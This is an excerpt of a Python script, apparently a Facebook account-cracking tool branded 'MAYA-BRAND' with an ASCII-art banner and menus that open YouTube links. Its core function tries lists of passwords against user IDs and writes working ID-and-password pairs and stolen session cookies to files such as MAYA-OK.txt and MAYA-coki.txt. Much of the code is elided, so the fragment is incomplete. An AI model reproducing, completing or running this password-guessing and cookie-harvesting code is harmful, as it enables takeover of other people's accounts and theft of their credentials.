...
logo =                                          ("""   
┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┑
┃\034[1;91m: Subscribe kr liya kro 🥺😔
.88b  d88.  .d8b.  db    db  .d8b.  
88'YbdP`88 d8' `8b `8b  d8' d8' `8b 
88  88  88 88ooo88  `8bd8'  88ooo88 
...
└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
    ...
    ┌━━━━━━━━━━━━━━━━━  (SHAR-BRAND━━━━━━━━━━━━━━┑
               \033[1;97mCREATED BY   :  AMIR (SHAR)            
               \033[1;91mFACEBOK         :  X.A.Moha         
               \033[1;97mGITHUB            :  ******🕶️     
               \033[1;91mSTATUS.          :   FREE         
               \033[1;97mTITLE              :  (MAYA-BRAND🕶️)           
               \033[1;91mTOOL VIRSION :  *.1                    
           \033[1;97mCOMMOND FOR:  ONLY FOR MAYA LOG🕶️         
      └━━━━━━━━━━━━━━━━━ H4CKER ━━━━━━━━━━━━━━━━━┘
""")
...
def menu():
	...
	if ot == '2':
		os.system('xdg-open https://www.youtube.com/shorts/q_s8_Eg79ds?feature=shared')
		rndm()
...
def menu1():
	...
	ot = input('\n   \x1b[1;32m Choose option >>> ')
	if ot == '1':
		os.system('xdg-open https://www.youtube.com/@@Jobsupdatesyt')
		crack_file()
	if ot == '2':
...
def c(uid,pwx,ln):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r%s[MAYA_H4CKER] [%s/%s] [OK-%s] [CP-%s] \r'%(wa,loop,ln,len(oks),len(cps))),
            sys.stdout.flush()
         ...
         #   log_cookies=session.cookies.get_dict().keys()
            ...
            #	botok(uid,ps)
            	...
            	cid = coki[65:80]
            	print('\033[1;92mMAYA-OK[😁]\033[1;92m] \033[1;92m' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
            	print('\033[1;92m[\033[1;92m🍪\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	open('MAYA-OK.txt', 'a').write( cid+' | '+ps+'\n')
            	open('MAYA-coki.txt', 'a').write(coki+'\n')
            	...
            	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            	cid = coki[82:97]
            	print('\33[1;30m(MAYA-Cp [💔] '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
            	#print('\033[1;92m[\033[1;92mðŸª\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	open('MAYA-CP.txt', 'a').write( uid+' | '+ps+' \n')
            	cps.append(cid)
            	break
            else:
            	#print (random_header())
